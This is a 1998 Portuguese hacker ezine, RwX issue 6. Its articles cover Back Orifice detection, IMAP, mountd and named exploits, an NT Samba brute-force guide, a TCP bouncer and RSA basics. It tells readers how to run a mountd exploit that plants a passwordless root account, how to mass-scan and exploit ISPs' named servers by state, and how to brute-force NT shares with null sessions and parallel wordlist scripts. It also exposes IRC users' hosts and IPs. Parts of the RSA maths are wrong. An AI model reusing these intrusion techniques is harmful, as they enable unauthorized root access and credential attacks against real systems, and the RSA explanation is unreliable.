@@ -1,0 +1,966 @@
+Introducao RwX 06!
+-start-
+:::::::::::::::::::::::::::::::::::::::::::::::::::::::
+::::::::""`````""::::::""`:.:`""::"`````"::'"```'.:::::
+::::: .g#S$$$$$S#n  .g#S$$     $$S#n. $$$S#s s#S$$$ :::::
+::::: $$$$$$ $$$$$  $$$$$$ $$$ $$$$$$ .  $$$ $$$   .:::::
+::::: $$$$$$g$$$$$. $$$$$$ $$$ $$$$$$ :'  $$g$$   .::::::
+::::: $$$$$$ $$$$$$ $$$$$$ $$$ $$$$$$ ' $$$$ $$$$  ':::::
+::::: $$$$$$  $$$$$ $$$$$$.$$$.$$$$$$ $$$$$ . $$$$$ :::::
+::::: $S$$$$   $$$$ `S$$$$$$$$$$$$$S'.`S$$  :  $$S'.:::::
+:::::.......:.....:::.............:::....:::....:::::::
+:::::::::::::::::::::::::::::::::::::::::::::::::::::::
+
+RwX 06 - Ate q enfim!
+
+A sua, a minha, a nossa RwX!:)
+
+		"Everybody is ignorant, only in different subjects"
+					Will Roger
+
+                "Policia para quem precisa"
+					Titas :P
+
+-x-x-x-x-x-x-x-x-x-x-x-x-x-x-x-x-x-x-x-x-x-x-x-x-x-x-x-x-x-x-x-x-x-x-x-x
+
+	Opa, estamos de volta. Desculpa a demora para lancar este ultima
+edicao, mas e' que precisamos ter um certo material de bom(?) nivel para
+poder sair a zine. Tem bastante programinha ai pra voces brincarem nessa
+edicao. Temos tambem a partipacao de alguns carinhas, que fizeram uns
+textos legais, e se tiverem mais materias legais, vao aparecer aqui de
+novo. Se voce tem uma materia legal, mande-nos, que aparece aqui. A pagina
+da rwx ta com uns 'features' ate legalzinhos, um search engine onde voce
+podera procurar nas rwxs passadas ou em sites cadastrados na nossa db, e
+uma 'lista' de update, onde voce ira receber um email quando uma nova rwx
+sair ou a pagina tiver mais um 'feature'.  Bem , espero que voce se
+diverta por essa edicao, e mande-nos um email falando sobre o que achou
+desse tao suado trabalho!:)
+
+OBS : O X-Satanic ta enchendo o saco, mas vou dizer aqui, e' pra avisar
+que ele mudou o nick o X-Satanic agora e' [0x5002] .
+
+KByte e toda a RwX
+kbyte@rwx.ml.org
+
+Links :
+http://members.xoom.com/cszine - Um bom zine ai, e' incrivel como o cara
+consegue escrever tanto em tao pouco tempo. Tem mais de 20 edicoes do zine
+em um tempo bem curto. Sera que ele faz alguma outra coisa da vida? :)
+
+www.live-media.net/coders00.zip - Zine Coders. Muito bom. Pegue e enjoy!
+--
+
+Obs : A lista update da nossa page, conta agora com quase 100 emails
+cadastrados. Nao eh uma lista comum, por nao receber mensagens, so manda
+email para as os emails cadastrados. A lista eh Low Flow , isto e' deve ir
+no maximo um email por mes, portanto nao se preocupe que a lista vai
+encher sua mailbox e se cadastre la.
+Obs 2 : O search engine agora esta praticamente so para procurar em
+topicos da rwx, ja que tem poucos sites cadastrados, portanto vamo la
+cadastrar os sites que voces acham interessantes :
+http://rwx.ml.org/cad.htm
+
+----------------------------------------------------------[introducao]----
+
+                        ooooooo INDEX oooooooo
+
+01 - Back Orifice and RWX BO (veja RWX BO)!.................AnArChY e KByte
+02 - O que andam fazendo nossos 'hackers'?..................KByte e [0x5002]
+03 - EMAILS ................................................................
+04 - Imap Exploits ..........................................AnArChY
+05 - Mountd Bug .............................................KByte
+06 - Named Bug ..............................................KByte
+07 - neped ..................................................kcsh
+08 - The NT Project Overflow Project ........................[0x5002]
+09 - NT Samba Attack ........................................[0x5002]
+10 - TCP Redirector vershun 0.0beta ........................[0x5002]
+11 - Criptografia RSA ......................................Eraser
+12 - Verificador de Senhas .................................Br4d0ck
+13 - Membros ..............................................................
+
+-----------------------------------------------------------------[rwx06]---
+
+1-BackOrifice by AnArChY e KByte
+--------------
+
+Acho que todos ja ouviram falar do BackOrifice um programa criado por um
+grupo chamado Cult of Dead Cow lancado oficialmente na defcon.
+Esse nome dado em uma gozacao ao programa da M$ chamadoBack Office.
+O BackOrifice controla sua maquina remotamente, funciona como uma backdoor
+em computadores rodando o win95/98.
+
+Apesar de tudo o BackOrifice so eh instalado em seu sistema se executado
+portanto uma das boas prevencoes eh tomar cuidado com oq vc recebe ou por
+quem vc recebe os arquivos ficando esperto ao executa-lo.
+
+O BackOrifice apos ser instalado, se instala nos registros da maquina para
+se autoexecutar toda vez que inicializar e abrir uma porta UDP 31337
+(notem , eleet :)) que entao servira de gateway para o bo client agir.
+Ele nao roda como um processo comum, isto e', nao dar pra dar alt + tab e
+ver ele la..Ele fica quase que invisivel...
+
+Digite no prompt do DOS:
+C:\>netstat -na
+udp        0      0 0.0.0.0:31337
+se apareceu essa porta com certeza vc foi vitima do BO.
+* a porta 31337 eh a default pode ser mudada de acordo com o invasor.
+
+Coisas que o invasor pode fazer na sua maquina, se voce tiver instalado o
+BO:
+- Rebootar a maquina
+- Ver as senhas logadas
+- Abrir como se fosse uma shell (Command.com) em alguma porta
+- Ver seus arquivos via servidor http
+- Gravar os keylogs da maquina
+- e muito mais.
+
+O programa detector/removedor do BO foi feito pela MadBadger Software e
+chama-se B.O.R.E.D. (arquivo anexado a zine Bored_rt.zip)
+Depois de descompactar o arquivo rode o bored.exe e ele ira procurar o BO
+em seu sistema e remove-lo. Muito simples :)
+
+Alguns problemas do B.O.R.E.D. sao:
+-ele foi testado somente com Windows 95 mas deve rodar perfeitamente no 98
+tb.
+-O principal problema do B.O.R.E.D., ele procura somente pela instalacao
+default do BO em seu sistema. Mas ja eh um bom comeco ja da pra se
+previnir.
+
+Aviso: um detector/removedor falso do BO esta sendo enviado na internet
+ele se chama BOSniffer e ele funciona como um proprio trojan em seu
+sistema. Portanto tomem cuidado.
+
+qqer duvida
+AnArChY <anarchy@rwx.ml.org>
+or
+KByte <kbyte@rwx.ml.org>
+
+-x-x-x-x-x-x
+ ADDENDUM
+-x-x-x-x-x-x
+	Na rwx esta indo o programa RwXBO, que ira rodar no linux, como o
+BO, ele ira abrir a porta 31337 UDP do linux, esperando espertinhos
+scaniando o ip para procurar bo, tambem ira logar os comandos mais usados.
+Ele ira gravar o log para o /var/log/messages, ou o outro arquivo de
+configuracao de syslog da sua maquina. O programa foi criado por [0x5002]
+e KByte e com ajuda de lrk0rx (Valeu, mano) e esta no dir progs da sua
+rwx.
+
+Sintaxe : Rode simplesmente rwxbo sem nenhum argumento.
+
+KByte
+kbyte@rwx.ml.org
+
+-----------------------------------------------------------------[rwx06]---
+
+O que andam fazendo nossos 'hackers'
+
+Bem , afim de testar o RwXBO, entramos na rede dsgX, no canal #hackers e
+vimos o nivel do canal de la. Vamos ao que interessa :
+
+Out 1 21:52:11 kbyte rwxbo[348]: RwXBO:200.242.252.30>passes or info
+Out 1 21:52:35 kbyte last message repeated 2 times
+
+Vai ganhar pela teimosia e'?hehe!
+Que feio isso hein Sysdevil?
+
+|sysdevil[off] was (sysdevil@$ds$YJ4HScbOSRp5cqCtWs9O8bb-DsgXBrain.libnet.com.br
+³ircname  :§û®VíVª£ ºf tHë fíttë§t (leopard)
+³server   : rave.dsgx.org (Thu Oct  1 22:06:19 1998)
+
+Oct  1 22:07:34 0x5002 rwxbo[353]: RwXBO:200.251.1.80>passes or info
+Oct  1 22:07:50 0x5002 last message repeated 3 times
+
+Voces gostam mesmo de bo, nao e' mesmo GoDPower?
+
+|GoDPoWer (~r0x@$ds$4Uh7fNjuvELsXHMRV7hotpp-DsgXBrain.bhnet.com.br)(Brazil)
+³ircname  : r0x supreme
+|channels : #BH #hackers
+³server   : rave.dsgx.org ([0.0.0.0] DsGX NetW0rk (rave.dsgx.org))
+
+Nada pessoal, mas esses acessam o #hackers. Provavelmente porque se
+julgam tais.
+
+-----------------------------------------------------------------[rwx06]---
+
+Imap exploits - By Anarchy
+
+===>IMAP
+
+1-Impact
+
+A culpa eh da rotina server_login() causa buffer overflow nessa funcao
+ganhando root remoto no sistema.
+
+2-Sistemas por default afetados:
+
+AIX 4.2.1
+OpenLinux 1.0
+RedHat 4.2; 5.0; 5.1
+SCO UnixWare 7
+
+3-Versoes vulneraveis
+
+ imapd anteriores a v10.234 (distribuida com o Pine 4.00)
+ ipop2d anteriores a 2.3(32)
+ ipop3d anteriores a 3.3(27)
+
+Olhem 1o a versao do seu imapd pra ver se eh vulneravel
+Para determinar sua versao do imapd de um telnet para a porta 143 do seu
+host. exemplo:
+          # telnet host.com.br 143
+          Trying host.com.br...
+          Connected to host.
+          Escape character is '^]'.
+          * OK host.com.br IMAP4rev1 v10.190 server ready
+
+portanto a versao IMAP4rev1 v10.190 eh vulneravel, todos os server antes
+da versao v10.234 sao vulneraveis.
+
+4-SOLUCAO:
+
+Pegue o novo:
+ftp://ftp.cac.washington.edu/mail/imap.tar.Z
+
+5-EXPLOITS:
+
+Todos estao anexados a zine, abaixo segue os nomes:
+
+IMAP4rev1v10.203-exploit.c
+imapd_exploit.c
+imapd_redhat_exploit.c
+imappy.c
+
+6- SUGESTOES
+
+Impack103: Uma colecao confusa mas completa de scanners e exploits
+remotos de imaps:
+http://www.rootshell.com/archive-j457nxiqi3gq59dv/199804/impack103.tar.gz
+
+Outra colecao de exploits, menos completa:
+http://www.rootshell.com/archive-j457nxiqi3gq59dv/199711/imaps.tar.gz
+
+imap_scan.sh: Scanner de 143. Scanneia as 143 abertas de uma subnet.
+http://www.rootshell.com/archive-j457nxiqi3gq59dv/199709/imapd_scan.sh
+
+tcp_wrapper: Nesses casos de exploits remotos, um tcp wrapper cai muito
+bem.(pro lado do admin)
+ftp://info.cert.org/pub/tools/tcp_wrappers/tcp_wrappers_7.5.tar.gz
+
+-----------------------------------------------------------------[rwx06]---
+
+Mount vulnerabilidade - by KByte
+
+	Recentemente foi encontrado uma vulnerabilidade no rcp.mountd,
+permitindo acesso root remoto. A unica 'exigencia' seria que o server tem
+que estar rodando o nfs-server-2.2beta29 ou inferior(No caso o redhat 5.1
+eh afetado), podendo ou nao estar exportando algo.
+	O xploit esta no dir progs, mount.tgz e reside em 3 arquivos
+
+nfsmount.c - Main code
+nfsmount.x - Rpc Code
+makeit.sh - Script
+
+Voce para compilar, dee um chmod +x makeit.sh e ele devera criar o arquivo
+mx. So que o exploit gerado so servira para hosts com nada no
+/etc/exports, se o host estiver exportando algo (Cheque com showmount -e
+hostname), voce tera que alterar a linha #define __EXPORTFS 1 para
+#define __EXPORTFS 2 no arquivo nfsmount.c
+
+Bem e ai sera so executar ./mx host e ele criara uma conta de login z, sem
+password e com acesso root no host e botara ALL:ALL no hosts.allow para
+aceitar todas as conexoes oriundas de fora.:)
+
+Patch - Pegue a versao mais nova, ou entao desabilite o rpc.mountd no rcs
+scripts (Recomendavel)
+
+KByte
+kbyte@rwx.ml.org
+
+-----------------------------------------------------------------[rwx06]---
+
+Named Exploit - By KByte
+
+	Ja tem algum tempo que este bug esta rolando, mas so agora deu
+tempo de sair. Eu fiz um script (Na verdade sao 3), que vao scaniar e
+xploitar esse bug em provedores (Espero que seja com permissao), em class
+C (Por exemplo, 200.200.200.1 ate 200.200.200.255) ou em estados do
+Brasil. O bug consiste na funcao req_iquery do named, que permite um
+segmentation violation, entao permitindo o ataque remoto.
+
+Usando
+
+check - Use check ip_da_maquina para checar se ela eh xploitavel e se for,
+xploit it!
+
+check2 - Use check2 sigla_do_estado. Ele usa um pequeno programinha do
+[0x5002] para pegar a lista de provedores do estado via CADE(TM)hehehe, e
+entao tenta o check em todos os provedores
+
+check3 - O check3 ira checar toda uma class c (200.200.200.1 ate
+200.200.200.255 por exemplo) em busca de maquinas com named bugado e
+xploita-las.
+
+-----------------------------------------------------------------[rwx06]---
+
+Bem, ai vai o programa scan.tgz no dir progs. Bom divertimento!
+Neped - by kcsh
+
+	Ae galera sou novo no pedaco , e a minha primeira vez que estou
+escrevendo pela rwx, nesta edição eu vou falar sobre o neped.
+O neped ele procura interfaces interfaces promíscuas na sua rede (linux),
+identificando sniffers que posso esta rodando na sua maquina.
+	O neped foi feito pelos 'Toxyn' , e deve funcionar tanto em Linux
+glibc (RedHat 5.x) quando em libc(As demais).
+	Na sua maquina, voce pode detectar o sniff, simplesmente rodando o
+/sbin/ifconfig e checando se esta em modo PROMISC como por exemplo se
+tiver mais ou menos assim no eth0
+UP POINTOPOINT RUNNING PROMISC MTU:552 Metric:1
+Legal, voce esta sendo sniffado e provavelmente ja comprometeu toda a sua
+rede.>:)
+
+Pequeno patch do dumped <dumped@uground.org> ,que faz a checagem de target
+hardware address do pacote arp para ver se e' igual ao local mac addr ou
+broadcast mac addr, se nao for, ignora, nao permitindo que o neped veja se
+esta promisc ou nao.
+
+-CUT HERE-
+--- arp.c.orig  Mon Sep 21 23:42:50 1998
++++ arp.c       Tue Sep 22 23:11:30 1998
+@@ -1867,8 +1867,11 @@
+                        }
++                       if(dev->dev_addr != arp->ar_tha)
++                       {
++                               if(arp->ar_tha == dev->broadcast)
++
++                               else
++                                       kfree_skb(skb, FREE_READ),
++                                       return 0;
++                       }
++                       break;
+-CUT HERE-
+
+Bem esta ae o source do neped no dir progs.
+
+Duvidas "kcsh@usa.net"
+
+-----------------------------------------------------------------[rwx06]---
+
+- The NT Overflow Project - [Announce]
+
+    Diz ae galera, pelo nome na introducao, jah deve saber quem sou eu, o
+0x5002 :), eh.. o ex-X-SaTaNiC
+
+    So... eu to aqui pra fazer uma convocacao a todos os programadores de C/ASM
+e administradores de NT que tb mexam com programacao, depois de muito analizar
+os varios buffer overflows presentes nos servers de Mail do NT, cheguei a
+conclusao que o mundo precisa adentrar uma nova geracao de Exploits... os
+exploits pra NT, nao eh justo que so o Linux, o melhor sistema, tenha
+programas que possa explorar suas falhas enquanto o NT fica so na base dos DoS.
+
+[FERRAMENTAS:]
+   Pretendo usar o compilador GNU pra Windows, pois eh o que mais se assemelha
+   Linux.
+   Procuro tambem uma especie de GNU Debugger (gdb) pra windows, eh o melhor
+   que eu encontrei.
+
+[PRE REQUESITOS:]
+   Apenas programacao em C ou Assembly, um pequena introducao ao buffer
+   overflow seria util, mas nao eh necessario devido ao material que vc
+   tera' acesso ao entrar no projeto.
+
+[ALVOS:]
+   Os ataques de buffer overflow visam os daemons:
+   SLMail versao 2.4, 2.5, 2.6 e 3.1
+   Miscrosoft Exchange sem Patch
+
+::# QUER ENTRAR PARA O PROJETO?
+   Mande um mail para: info@rwx.ml.org, no subject coloque: NT Overflow
+   no corpo da mensagem coloque seu nome, seu nick se vc tiver um e
+   principalmente seu e-mail para resposta
+
+----------------------------------------------------------------[rwx-nt]-----
+
+NT Samba Brute Force - by [0x5002]
+--
+Samba Patcheado para brute force
+progs/supersamba.tgz
+--
+O. NT Samba BRUTE FORCE .O
+
+.x By          : [0x5002]
+.x From        : RWX
+.x Sistema Ope : Windows NT 4.0/3.51 - Windoze 95/98 - nee more?
+.x Tipo/Ataque : Remoto
+.x Compromisso : Entrar no sistema atraves de um Brute Force.
+               : Invadir qualquer sistema Windoze 95/98 com compartilhamento
+               : de algum disko sem senha.
+.x What else?  : update from CIFS.
+
+(O verdadeiro samba updated foi o Samba 1.9.15p8, mas essa versao sumiu do
+ mapa, entao eu dei update manualmente no Samba-1.9.16p11 e modifiquei o
+ Makefile pra compilar sob glibc tb)
+
+SAMBA:
+Bem, aqui eu irei mostrar um pouco do protocolo TCP/IP NetBIOS, pouca
+gente sabe pra que isso tah ai', mas a resposta e' simples, file-sharing...
+alem de mostrar uma conexao basica feita por um cliente Samba.
+Aqui nos usaremos o Unix Samba package para explorar esse SMB.
+Pouca coisa e' preciso para comecar...
+
+1x: Fazendo uma conexao SMB
+ x:1.2 IP address do alvo
+ x:1.3 Porta de Acesso
+ x:1.4 Nome do Alvo
+ x:1.5 User/Pass logon
+ [Apendice A]
+
+2x: Disk/HD/CDROM
+
+3x: Saindo do mundo dos sonhos...
+
+Estrutura da Conexao:
+A cada conexao que voce faz a mensagem do seu SMB contem a versao do seu
+sistema Operacional, e um cabecalho chamado UID.
+
+IP ADDRESS DO ALVO - Arrume o IP Address da maquina do alvo, e' onde tudo
+                     comeca. :)
+PORTA DE ACESSO    - Bem, se o server tiver porta de NetBIOS acessivel (e'
+                     dificil servers que nao tenham, ai fica tudo um mar
+                     de rosas :)
+[NOME DO ALVO]
+   Digamos que aqui comeca o Hard Work, a cada conexao SMB que voce tenta
+fazer a um determinado IP, tem que ser direcionado a um nome, uma especie
+de DNS, mas nao confunda por exemplo: www.ntvictim.com nao quer dizer que
+o nome em questao seja ntvictim. Esse 'nome' e' setado na hora da instalacao
+do server NT em questao, pode ser nome da makina no Workgroup etc...
+mas isso nao vem em questao, o problema eh como conseguir esse nome.
+Simples, NMB Look Up :)
+
+bash# nslookup nt.machine.org
+Name:    nt.machine.org
+Address:  5.5.5.3
+
+(pS: nmblookup eh mostrado apenas para vc ver como fazer o servico com as ferramentas do samba, pq aqui tah incluido um programa que da de cara do nome da makina).
+
+bash# nmblookup -B 5.5.5.3 -S \*
+5.5.5.3 *
+Looking up status of 5.5.5.3    |-> (esse e' o nome que procuramos, o do <00>)
+received 6 names     |----------|
+        NT <---------|  <00> -         B <ACTIVE>
+        MACHINE         <00> - <GROUP> B <ACTIVE>
+        NT              <20> -         B <ACTIVE>
+        MACHINE         <1c> - <GROUP> B <ACTIVE>
+        MACHINE         <1e> - <GROUP> B <ACTIVE>
+        NT              <03> -         B <ACTIVE>
+num_good_sends=0 num_good_receives=0
+
+.O. [User/Pass Logon] .O.
+
+ A maior parte dos erros acontece bem aqui, essa e' a parte onde nao
+depende muito de voce, mas sim do ADMIN do NT. Muitos servers necessitam
+que o pass seja todo maiusculo, mas nao e' todo problema, pois o cliente
+que vai aqui tem essa opcao na hora da compilacao.
+  Os dois logins 'mais populares' sao ADMINISTRATOR e GUEST (tente esses
+com sem passwords), esses dois sao criados na hora da
+instalacao, um backup do SAM(pwd) e' feito apenas com esses dois
+logins, outros backups mais pra frente podem conter o nome de outros users
+criados depois. Alguns admins renomeiam a conta do ADMINISTRATOR, na hora
+que for logar, tente tambem o 'nome do NT' (i.e. MAQUINA_NT), se o server
+estiver usando tambem o Microsoft Web Server uma conta IUSR_MAQUINA_NT e'
+criada. Tente tambem contas com pwds conhecidos em UNIX, muitos desses tem
+passwords nulos(\0), se o Server estiver rodando o SAMBA separadamente
+tente as contas 'pcguest' com null-pass, as vezes ela e' renomeada para
+'nobody'.
+
+---------------------------[APENDICE A]--------------------------------
+Pegando a lista de shares de um Windoze95/NT:
+
+1o. Adicione o IP Adress do alvo a sua makina.
+C:\> NBTSTAT -A 1.1.1.1
+
+2o. C:\> NET USE \\IP\IPC$ "" /user:""
+
+3o. Verifique a lista de Shares
+C:\> NET VIEW \\maquina ('nome')
+(se quiser checar os dirs da makina: DIR \\maquina\share)
+
+4o. Pegar a lista de users
+ NET VIEW \\IPaddress ou
+ NET VIEW \\www.maquina.nt.victim.com
+----------------------------------------------------------------------
+
+2x: Share Filesystem
+  Na hora de acessar as determinadas maquinas, nos nao usamos \\MAQUINA\C:
+ou coisas do tipo.. usamos o share correspondente.
+  Em uma maquina NT, "NET USE * \\MACH\SHARE" cria uma letra de drive com
+o determinado SHARE remoto, no caso do do client SMB pra UNIX:
+  $ smbclient -L \\\\NOME_DA_MAQUINA\\SHARE -I ip -parametros
+  Mas no que estamos usando, ele apenas cria um processo, que se vai
+quando voce sai da maquina.
+
+3x: Pondo tudo junto
+
+(So' faca isso na presenca de um adulto)
+[1] Arrume uma Wordlist
+
+[2] Pegue o 'nome do maquina'
+    nmblookup -B {ip} -S \* (se nao funcionar, tente o de baixo)
+    nmblookup -B {ip} -S WORKGROUP#0
+
+(isso eh com o nmblookup normal, mas aqui vai incluido um programa que pega
+o nome da makina da vitima apenas vc dando o ip/host dela, good yah?)
+
+                                                Username <---
+[3] Brute Force                                              |
+
+-------------------------[Teoria]----------------------------------------
+    smbclient -L {TARGET} -I {ip} -d 3 -n " " -m LANMAN2 -U ADMINISTRATOR
+                                   |
+                                   |-> Debug Level Complete
+
+    * Se voce preferir usar um dicionario de passwords, teste isso:
+
+    Debug Level 0 - Nao mostra mensagens
+                                   |
+    smbclient -L {TARGET} -I {ip} -d 0 -n " " -m LANMAN2 -U BACKUP < dictfile
+                                                             |
+                                             User backup <---|
+------------------------------------------------------------------------
+The really hard work!
+
+smbclient \\\\NT_MACHINE\\SHARE -n PIRULITO -m LANMAN2 -U USER0001 \
+-I 1.1.1.1
+smb: \> cd \windows
+smb: \windows> cd system32
+smb: \windows\system32> <-- Usuario normal pode escrever aqui
+
+Dica: Tente conectar muitas vezes de uma so vez (faca um script) e teste
+      varios dicionarios diferentes ao mesmo tempo...
+      (jogue o processo pra background).
+algo tipo:
+
+    [WARNING: Olhe se o server necessita de passes em UPPERCASE(maiusculo)]
+    [tome cuidado com o dicionario.                                       ]
+
+#!/bin/sh
+AT="smbclient -L {TARGET} -I a.b.c.d -d 0 -n 'bah '-m LANMAN1 -U ADMINISTRATOR"
+$AT < wordlist1 &
+$AT < wordlist2 &
+$AT < wordlist3 &
+
+E por hoje e' so' pessoal! :)
+
+=> Duvidas?
+=> xsatanic@rwx.ml.org
+
+Addendum
+-x-x-x-x-x
+O Kbyte fez um scriptzin para testar o samba nos servers, eh o
+sambahack.tgz que ta no dir progs.
+-x-x-x-x-x
+
+-----------------------------------------------------------------[rwx06]---
+
+TCP Redirector vershun 0.0beta by [0x5002]
+
+[1o. Esclarecimento: O Protocol Redirector nao eh um projeto da RwX, mas ateh
+agora o TCP Source foi desenvolvido por mim]
+
+   Diz ae... bem, voces ja' alguma vez na vida devem ter ouvido falar de
+bouncers... mas o que diabo eh isso?
+   Bouncer eh simplesmente um programa que manda as informacoes vinda de algum
+servidor externo para seu cliente de conexao... nao entendeu?
+olha esse esquema:
+
+   _______INFORMACAO__X_->__________    _____________INFORMACAO_X__->_____
+  |                                 |  |                                  |
+[  CLIENTE ]                 [ SERVIDOR COM BOUNCER ]             [ irc.x.org ]
+[ (BitchX) ]=================[ (Protocol Redirector)]=============[   (ircd)  ]
+[  -voce-  ]                 [       -shell-        ]             [-serv. exte]
+  |__<--__INFORMACAO_Y_____<--____|        |_____<--_INFORMACAO Y_________|
+
+  Bem, aqui eu dei um exemplo inutil que foi o de IRC, mas o bouncer que eu
+fiz com a ajuda de um amigo (valeu TYPe) abre conexoes tb com telnet/pop3/smtp
+etc... http e ftp ainda nao foram implementados.
+
+::# Usando o bouncer
+
+* Infelizmente por falta de tempo, ainda nao pude facilitar o uso do bouncer,
+mas espero que na proxima RwX, ele esteja todo completo e um pouco mais simples.
+
+  Jah que comecamos com IRC, vou comecar com um exemplo de IRC e outro de telnet
+por favor, leia os dois, pois eles tem uma diferenca muito importante.
+
+[1] Compilando
+  Se vc usar Linux (com excecao dos Red Hat's 5.X) compile com a seguinte linha:
+  $ gcc -D__resource__ -o ptcred ptcred.c
+
+  Mas se vc usar os RHs ditos acima ou freeBSD compile com:
+  $ gcc -o ptcred ptcred.c
+
+[2] Executando
+  Executa e pronto, ele vai mudar o nome do processo pra -bash, nao eh necessa-
+rio ser root para executa-lo
+
+[3] Usando
+  Aqui vao dois exemplos, LEIA OS DOIS, pois eles tem diferenca!
+
+(BitchX)
+ùíù Connecting to port 9999 of server xxx.org [refnum 2]
+-PTC.Redirector(info)- o. Welcome to PROTOCOL Redirector .o
+-PTC.Redirector(info)- WHERE SHOULD I CONNECT TO?
+
+[0] /quote irc.brasnet.org
+
+-PTC.Redirector(host)- [irc.brasnet.org]
+-PTC.Redirector(info)- What port?
+
+[0] /quote 6667
+
+-PTC.Redirector(port)- [6667]
+
+pronto.. ai voce vai conectar no IRC.
+
+(Telnet)
+  Bem, eh aqui que vem aquilo que disse no comeco, ainda nao tive tempo de
+ajeitar isso aqui, se vc nao tah fazendo nada faz ai e me manda, mas na prox.
+versao jah vai tar direito.
+
+Trying 127.0.0.1...
+Connected to 127.0.0.1.
+Escape character is '^]'.
+:PTC.Redirector NOTICE AUTH :info o. Welcome to PROTOCOL Redirector .o
+:PTC.Redirector NOTICE AUTH :info WHERE SHOULD I CONNECT TO?
+127.0.0.1  <----- SIM, vc precisa digitar 2 parametros antes do verdadeiro
+127.0.0.1  <----- isso eh so preguica, e tb porque o bx manda 2 parametros
+127.0.0.1  <----- assim que conecta, foi o jeito mais rapido de ignora-los
+
+:PTC.Redirector NOTICE AUTH :host [127.0.0.1]
+:PTC.Redirector NOTICE AUTH :info What port?
+23
+:PTC.Redirector NOTICE AUTH :port [23]
+
+Linux 0x5002.coderz.org 2.0.35 #1 Thu Jun 25 01:32:58 EST 1998 i686 unknown
+----------
+login:
+
+                                                            [0x5002].
+
+------------------------------------------------------------------[rwx06]----
+
+Criptografia RSA - By Eraser
+CRIPTOGRAFIA RSA
+----------------
+
+by ErAsEr
+
+Aloha pessoal! Estou escrevendo pela primeira vez na rwx e com certeza espero
+escrever mais vezes nela. Nessa edicao vou falar de uma das criptografias mais
+populares atualmente :  A Criptografia RSA.
+
+Para comecar a explicacao eh melhor definir o que eh criptografia. Bem cripto-
+grafia vem do grego, onde cryptos significa segredo, oculto e grafia escrever.
+O termo criptografia no nosso portugues significa codificar informacoes para
+ninguem mais alem do emissor e receptor poderem ler. Complicado, nao? Bem vou
+dar um exemplo : Na primeira guerra, alguem de uma base codificava uma mensagem
+e enviava para outro, pois soh assim o pessoal de outra base poderia ler. Ima-
+gine de o cara de uma base inigima lesse o conteudo?
+
+Um pouco de historico : O RSA foi inventado em 1978 por R. L. Rivest, A. Shamir
+e L. Adleman, (daih o nome RSA) que trabalhavam no MIT(Massachussets Institute
+of Techonology. Hoje o RSA eh amplamente hoje, inclusive o Netscape e o
+Explorer(eca!) o utilizam.
+
+Existem basicamente dois tipos de criptografia : O de chave publica e o de cha-
+ve privada. O de chave privada eh aquele onde so-
+mente o emissor e o receptor sabem como decifra-lo. Para ficar mais pratico,
+darei um exemplo :
+
+- Imagine que voce e um amigo seu querem mandar informacoes secretas um para o
+outro, mas o seu provedor loga tudo que voces mandam. Claro que se voce mandar
+tudo em texto puro, alguem que trabalha no provedor pode ler o que voce manda,
+certo? O que fazer? Codificar eh claro. Vou vazar uma codificacao simples de
+CHAVE PRIVADA.
+
+Para codificar, voce deve acrescentar 1 ao codigo ASCII da letra, logo para
+decodificar voce deve diminuir 1 a esse numero. Aih vai
+	VOCE (normal) : VOCE TEM O TELEFONE DA MARIA?
+        VOCE (codificado) : WPDF UFN P UDMDGPOD EB NBSJB?
+
+Para decodificar, basta diminuir um para achar a frase original. Esse exemplo
+eh uma encriptacao muito fraca, pois voce pode facilmente descobrir o que esta-
+va escrito, exemplo : Palava de somente uma letra, pode ser A,E ou O, ou seja,
+aquele P soh pode ser A,E ou O.
+
+Agora vamos para a chave publica. Como o nome proprio nome, nesse metodo todos
+sabem como codificar e decodificar. Mas como isso eh possivel? Vou dar como
+exemplo um banco:
+
+Voce vai entrar no site de um Banco X e fazer uma transferencia usando uma
+criptografia de chave publica:
+
+(voce entra)
+Banco : Para voce codificar, voce vai usar esse jeito A.
+Voce  : Para voce codificar, voce vai usar esse jeito B.
+(ou seja, para voce codificar vai usar A e o banco B)
+
+Nesse exemplo tem uma coisa estranha, nao? Tem sim : Como o banco decodifica
+sua mensagem?
+
+Aih que entra o fato de ser de chave publica : Se vice codificar como A, so-
+mente o banco vai saber decodificar e vice-versa. Vamos para o RSA que fica
+facil.
+
+Assim que voce entra no site, o banco escolhe dois numeros PRIMOS(*) p e q e
+gera um numero n que eh p vezes q(p*q). Logo depois de gerar n ele te envia n,
+de modo que o "jeito de codificacao" vai ser n. Para decodificar o banco vai o
+p e q que ele tem. Se o banco te enviar p e q, voce vai saber decodificar e nao
+adiantarah de nada.
+
+* Numeros primos sao aqueles que tem como divisores ele proprio e 1, por
+exemplo : 5,7,11,13,etc.
+
+Voce deve estar se perguntando? Se n=p*q, sendo que p e q sao primos, para achar
+n basta fatorar o n. Certo, mais tem um problema : Se voce escolher p e q primos
+como 100 algarismos cada, fica quase impossivel voce descobrir n. Vou dar um
+exemplo pratico : Vamos supor que n(=p*q) tenha 100 algarismos. Para fatorar do
+jeito que todos conhecem, voce vai ter que dividir n por todos numeros inteiros
+ateh raiz de n(pois um numero maior que a raiz de n ao quadrado e maior que n).
+(vou simbolizar a raiz de n por #n e tambem o quadrado de um numero por n**2).
+Se n tem 100 algarismos, voce vai ter que executar #(10**100) que eh igual a
+10**50 (na mao fica mais facil). Nesse caso voce vai executar 10**50 loops para
+achar os fatores. Imagine que voce tem um computador que executa 10**10 divisoes
+por segundo(um computador que faz isso ainda nao existe). Logo voce vai gastar
+(10**50)/(10**10)=10**40 segundos. Calculando isso em anos dah aproximadamente
+10**31 anos. Para informacao : desde o "Big Bang" se passou 10**11 anos. Logo
+voce nao vai querer fazer assim, certo? Bem, a seguranca do RSA depende disso,
+pois se voce fatorar n voce "quebra" ele.
+
+Vamos ver como funciona o RSA : Primeiramente voce deve escolher dois primos
+p e q grandes(para ser dificil de quebrar). Num exemplo pratico, vou escolher
+p=9781 e q=9901. Vamos supor que temos um bloco de mensagem : ABC Vamos passar
+para ASCII : 65-66-67
+
+Como disse anteriormente voce vai precisar de n=p*q que eh n=96841681=9781*9901
+Alem de n voce vai precisar de uma funcao matematica chamada phi, sendo que
+phi(n)=(p-1)*(q-1) quando p eh q sao primos.
+Entao phi(n)=96822000
+
+Para codificar voce vai precisar de um numero e, que eh qualquer numero que nao
+divide n. Para seguranca eh recomendavel usar o menor numero que nao divide
+phi(n). Entao esse e eh 7 pois 2,3,4 e 5 dividem phi(n).
+
+Para codificar um bloco b, basta achar o resto da divisao de b**e por n.
+Vamos pegar o primeiro bloco 65 :  o resto da divisao 65**7 por 96841681 eh
+5156724. Entao o primeiro bloco codificado eh 5156724. Fazendo isso para os
+outros blocos achamos :
+
+	5156724-68810326-68683300
+
